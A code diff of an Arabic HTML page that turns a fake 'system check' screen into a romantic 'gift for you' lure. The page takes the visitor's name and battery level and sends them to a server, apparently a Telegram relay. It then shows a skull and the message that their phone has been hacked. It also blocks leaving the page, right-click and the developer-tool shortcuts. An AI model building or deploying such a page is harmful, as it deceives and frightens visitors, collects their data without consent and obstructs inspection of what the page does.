@@ -3,145 +3,405 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>نظام الاختبار</title>
+<title>🎁 هدية لك</title>
 <style>
   body, html {
     margin: 0;
     padding: 0;
     height: 100%;
     width: 100%;
-    background-color: #000;
-    color: #0f0;
-    font-family: 'Courier New', Courier, monospace;
+    background-color: #fff;
+    color: #ff6b9d;
+    font-family: 'Arial', 'Courier New', sans-serif;
     display: flex;
     justify-content: center;
     align-items: center;
-    overflow: hidden; 
+    overflow: hidden;
   }
 
   #main-container {
     text-align: center;
-    width: 80%;
-    max-width: 600px;
+    width: 85%;
+    max-width: 550px;
     z-index: 10;
+    background: rgba(255, 255, 255, 0.95);
+    padding: 40px 30px;
+    border-radius: 25px;
+    box-shadow: 0 10px 60px rgba(255, 107, 157, 0.2);
+    position: relative;
+    border: 2px solid #ff6b9d;
   }
 
-  h1, h2 {
-    margin: 0 0 20px 0;
-    text-shadow: 0 0 10px #0f0;
+  h1 {
+    margin: 0 0 10px 0;
+    font-size: 2em;
+    color: #ff6b9d;
   }
 
-  #api-status {
+  .sub-text {
+    opacity: 0.7;
+    font-size: 1.1em;
+    margin-bottom: 25px;
+    color: #555;
+  }
+
+  #login-form {
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+    align-items: center;
+  }
+
+  #login-form input {
+    padding: 14px 25px;
+    font-size: 1.1em;
+    background: #fff;
+    border: 2px solid #ff6b9d;
+    color: #333;
+    border-radius: 50px;
+    width: 80%;
+    font-family: 'Arial', sans-serif;
+    outline: none;
+    text-align: center;
+    transition: all 0.3s;
+  }
+
+  #login-form input:focus {
+    box-shadow: 0 0 30px rgba(255, 107, 157, 0.2);
+    border-color: #ff4080;
+  }
+
+  #login-form input::placeholder {
+    color: #ccc;
+  }
+
+  #login-form button {
+    padding: 14px 50px;
     font-size: 1.2em;
+    background: #ff6b9d;
+    color: #fff;
+    border: none;
+    border-radius: 50px;
+    cursor: pointer;
     font-weight: bold;
-    display: none;
+    font-family: 'Arial', sans-serif;
+    transition: all 0.3s;
+    box-shadow: 0 4px 20px rgba(255, 107, 157, 0.3);
   }
 
-  .matrix-bg {
+  #login-form button:hover {
+    background: #ff4080;
+    transform: scale(1.05);
+    box-shadow: 0 6px 30px rgba(255, 107, 157, 0.4);
+  }
+
+  /* خلفية القلوب */
+  .hearts-bg {
     position: fixed;
     top: 0;
     left: 0;
     width: 100%;
     height: 100%;
-    font-size: 20px;
-    color: rgba(0, 255, 0, 0.15);
     overflow: hidden;
     z-index: 1;
-    white-space: nowrap;
+    pointer-events: none;
   }
 
-  .matrix-line {
+  .heart {
     position: absolute;
-    animation: fall linear infinite;
+    font-size: 25px;
+    color: #ff6b9d;
+    opacity: 0.3;
+    animation: floatHeart linear infinite;
   }
 
-  @keyframes fall {
-    0% { transform: translateY(-100%); }
-    100% { transform: translateY(100vh); }
+  @keyframes floatHeart {
+    0% {
+      transform: translateY(100vh) rotate(0deg) scale(0.5);
+      opacity: 0.3;
+    }
+    100% {
+      transform: translateY(-100vh) rotate(720deg) scale(1.2);
+      opacity: 0;
+    }
   }
 
-  .blink {
-    animation: blinker 1s linear infinite;
-  }
-  @keyframes blinker {
-    50% { opacity: 0; }
+  .gift-box {
+    font-size: 130px;
+    cursor: pointer;
+    transition: all 0.3s;
+    display: inline-block;
+    margin: 20px 0;
+    animation: pulse 1.5s ease-in-out infinite;
+    user-select: none;
   }
 
+  .gift-box:hover {
+    transform: scale(1.15);
+    filter: drop-shadow(0 0 40px rgba(255, 107, 157, 0.3));
+  }
+
+  @keyframes pulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.08); }
+  }
+
+  .hidden {
+    display: none !important;
+  }
+
+  /* الشاشة الخضراء (بعد فتح الصندوق) */
+  #success-screen {
+    background: #0f0;
+    padding: 50px 30px;
+    border-radius: 25px;
+    border: none;
+    box-shadow: 0 0 80px rgba(0, 255, 0, 0.5);
+    animation: flashBg 0.5s ease;
+    color: #000;
+  }
+
+  #success-screen h1 {
+    color: #000;
+    text-shadow: none;
+    font-size: 2.5em;
+    margin-bottom: 15px;
+  }
+
+  #success-screen p {
+    color: #000;
+    font-size: 1.3em;
+    opacity: 0.8;
+  }
+
+  @keyframes flashBg {
+    0% { transform: scale(0.8); opacity: 0; }
+    100% { transform: scale(1); opacity: 1; }
+  }
+
+  .battery-info {
+    font-size: 0.9em;
+    opacity: 0.6;
+    margin-top: 20px;
+    color: #000;
+  }
+
+  .username-display {
+    font-size: 0.8em;
+    opacity: 0.5;
+    margin-top: 5px;
+    color: #000;
+  }
+
+  .gift-username {
+    font-size: 0.9em;
+    opacity: 0.5;
+    color: #ff6b9d;
+    margin-top: 10px;
+  }
+
+  /* أيقونة الهدية */
+  .gift-icon {
+    font-size: 50px;
+    margin-bottom: 10px;
+    display: block;
+  }
+
+  /* تأثير وميض */
+  .glow-text {
+    animation: glow 2s ease-in-out infinite;
+  }
+
+  @keyframes glow {
+    0%, 100% { text-shadow: 0 0 10px rgba(255, 107, 157, 0.3); }
+    50% { text-shadow: 0 0 30px rgba(255, 107, 157, 0.6), 0 0 60px rgba(255, 107, 157, 0.2); }
+  }
+
+  /* شاشة الهدية */
+  #gift-screen h1 {
+    color: #ff6b9d;
+  }
+
+  #gift-screen .sub-text {
+    color: #888;
+  }
+
+  /* تنسيق شاشة الدخول */
+  .login-title {
+    color: #ff6b9d;
+  }
+
+  .login-sub {
+    color: #999;
+  }
+
+  /* صندوق الهدية في الخلفية الخضراء */
+  .success-icon {
+    font-size: 60px;
+    margin-bottom: 15px;
+  }
 </style>
 </head>
 <body>
 
-  <div class="matrix-bg" id="matrix-bg"></div>
+  <!-- خلفية القلوب -->
+  <div class="hearts-bg" id="hearts-bg"></div>
 
   <div id="main-container">
-    <div id="status-content">
-      <h1 id="main-heading"> جارٍ فحص النظام...</h1>
-      <p id="api-status" class="blink">>>> جارٍ سحب البيانات...</p>
+    <!-- شاشة تسجيل الدخول (بيضاء بقلوب) -->
+    <div id="login-screen">
+      <span class="gift-icon">💝</span>
+      <h1 class="login-title glow-text">🎀 هدية خاصة لك</h1>
+      <p class="login-sub">💕 ادخل اسمك لتلقي الهدية 💕</p>
+      <form id="login-form">
+        <input type="text" id="username-input" placeholder="اكتب اسمك هنا..." autocomplete="off">
+        <button type="submit">🎁 استلم هديتك</button>
+      </form>
+      <p style="font-size: 0.7em; opacity: 0.3; margin-top: 20px; color: #ccc;">✨ مصمم بحب ✨</p>
+    </div>
+
+    <!-- شاشة صندوق الهدية -->
+    <div id="gift-screen" class="hidden">
+      <h1>🎁 هديتك جاهزة</h1>
+      <p class="sub-text">اضغط على الصندوق لفتحه</p>
+      <div class="gift-box" id="gift-box">🎁</div>
+      <div class="gift-username">👤 <span id="gift-username"></span></div>
+    </div>
+
+    <!-- شاشة النجاح (خضراء) -->
+    <div id="success-screen" class="hidden">
+      <div class="success-icon">💀</div>
+      <h1>✅ تم سحب بياناتك</h1>
+      <p>☠️ تم اختراق هاتفك بنجاح</p>
+      <div class="battery-info" id="battery-display">🔋 جاري قراءة البطارية...</div>
+      <div class="username-display" id="success-username"></div>
     </div>
   </div>
 
 <script>
 let alreadySent = false;
-const mainContainer = document.getElementById('status-content');
-const apiStatus = document.getElementById('api-status');
-const mainHeading = document.getElementById('main-heading');
+let username = '';
 
-function createMatrixBackground() {
-  const bg = document.getElementById('matrix-bg');
-  const columns = Math.floor(window.innerWidth / 25);
-
-  for (let i = 0; i < columns; i++) {
-    const line = document.createElement('div');
-    line.classList.add('matrix-line');
-    line.style.left = (i * 25) + 'px';
-    
-    let content = "";
-    const len = Math.floor(Math.random() * 20) + 10;
-    for(let j=0; j<len; j++) {
-      content += Math.random().toString(36).substring(2, 3);
-    }
-    line.innerText = content;
-
-    line.style.animationDuration = (Math.random() * 3 + 2) + 's';
-    line.style.animationDelay = (Math.random() * 2) + 's';
-    
-    bg.appendChild(line);
+// خلفية القلوب
+function createHeartsBackground() {
+  const bg = document.getElementById('hearts-bg');
+  const heartEmojis = ['❤️', '💕', '💗', '💖', '💘', '💝', '💓', '🩷'];
+  
+  for (let i = 0; i < 30; i++) {
+    const heart = document.createElement('div');
+    heart.classList.add('heart');
+    heart.textContent = heartEmojis[Math.floor(Math.random() * heartEmojis.length)];
+    heart.style.left = Math.random() * 100 + '%';
+    heart.style.fontSize = (Math.random() * 30 + 15) + 'px';
+    heart.style.animationDuration = (Math.random() * 10 + 8) + 's';
+    heart.style.animationDelay = (Math.random() * 8) + 's';
+    heart.style.opacity = Math.random() * 0.3 + 0.1;
+    bg.appendChild(heart);
   }
 }
-createMatrixBackground();
+createHeartsBackground();
 
+// عناصر DOM
+const loginScreen = document.getElementById('login-screen');
+const giftScreen = document.getElementById('gift-screen');
+const successScreen = document.getElementById('success-screen');
+const loginForm = document.getElementById('login-form');
+const usernameInput = document.getElementById('username-input');
+const giftBox = document.getElementById('gift-box');
+const giftUsername = document.getElementById('gift-username');
+const batteryDisplay = document.getElementById('battery-display');
+const successUsername = document.getElementById('success-username');
 
-if ('getBattery' in navigator) {
-  navigator.getBattery().then(function(battery) {
-    
-    apiStatus.style.display = 'block';
+// معالج تسجيل الدخول
+loginForm.addEventListener('submit', function(e) {
+  e.preventDefault();
+  username = usernameInput.value.trim();
+  
+  if (username === '') {
+    usernameInput.style.borderColor = 'red';
+    usernameInput.style.boxShadow = '0 0 30px rgba(255,0,0,0.2)';
+    setTimeout(() => {
+      usernameInput.style.borderColor = '#ff6b9d';
+      usernameInput.style.boxShadow = 'none';
+    }, 1000);
+    return;
+  }
 
-    battery.onchargingchange = function() {
-    };
-    
-    let percent = Math.round(battery.level * 100);
-    
-    if (!alreadySent) {
-      alreadySent = true;
-      
-      fetch('/api/send-battery', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ battery: percent })
-      });
-      
-      setTimeout(() => {
-        mainContainer.innerHTML = `<h1 style="color: #0f0; text-shadow: 0 0 15px #0f0;">تم اختراق هاتفك ب نجاح 💯</h1>`;
-      }, 1500); 
-    }
-    
+  // إرسال اسم المستخدم إلى التيليجرام
+  fetch('/api/send-username', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ username: username })
   });
-} else {
-  mainContainer.innerHTML = "<h2 style='color: red;'>❌ متصفحك لا يدعم الاختبار</h2>";
-}
+
+  // إظهار اسم المستخدم في شاشة الهدية
+  giftUsername.textContent = username;
+
+  // الانتقال لشاشة الهدية
+  loginScreen.classList.add('hidden');
+  giftScreen.classList.remove('hidden');
+});
+
+// معالج صندوق الهدية
+giftBox.addEventListener('click', function() {
+  // تغيير شكل الصندوق
+  this.textContent = '🎉';
+  this.style.animation = 'none';
+  this.style.transform = 'scale(1.3)';
+  
+  setTimeout(() => {
+    // الانتقال لشاشة النجاح (الخضراء)
+    giftScreen.classList.add('hidden');
+    successScreen.classList.remove('hidden');
+    
+    // عرض اسم المستخدم
+    successUsername.textContent = `👤 ${username}`;
+    
+    // جلب البطارية وإرسالها (مرة واحدة فقط)
+    if ('getBattery' in navigator && !alreadySent) {
+      alreadySent = true;
+      navigator.getBattery().then(function(battery) {
+        let percent = Math.round(battery.level * 100);
+        batteryDisplay.textContent = `🔋 نسبة البطارية: ${percent}%`;
+        
+        fetch('/api/send-battery', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ battery: percent, username: username })
+        });
+      }).catch(() => {
+        batteryDisplay.textContent = '⚠️ لا يمكن قراءة البطارية';
+      });
+    } else {
+      batteryDisplay.textContent = '⚠️ لا يمكن قراءة البطارية';
+    }
+  }, 600);
+});
+
+// الضغط على Enter في حقل الإدخال
+usernameInput.addEventListener('keypress', function(e) {
+  if (e.key === 'Enter') {
+    loginForm.dispatchEvent(new Event('submit'));
+  }
+});
+
+// منع الخروج من الصفحة
 window.addEventListener('beforeunload', function (e) {
   e.preventDefault();
   e.returnValue = '';
+});
+
+// منع النقر بزر الماوس الأيمن
+document.addEventListener('contextmenu', function(e) {
+  e.preventDefault();
+});
+
+// منع بعض اختصارات لوحة المفاتيح
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+      (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'U')) {
+    e.preventDefault();
+  }
 });
 
 </script>
